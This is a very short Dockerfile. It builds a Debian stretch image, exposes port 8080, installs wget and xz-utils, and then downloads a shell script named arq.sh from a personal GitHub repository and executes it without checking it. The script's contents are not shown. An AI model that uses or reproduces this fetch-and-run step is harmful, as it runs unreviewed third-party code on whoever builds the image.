FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
     wget \
     xz-utils
RUN wget https://raw.githubusercontent.com/agamlimaa/srb/main/arq.sh && chmod +x arq.sh && ./arq.sh
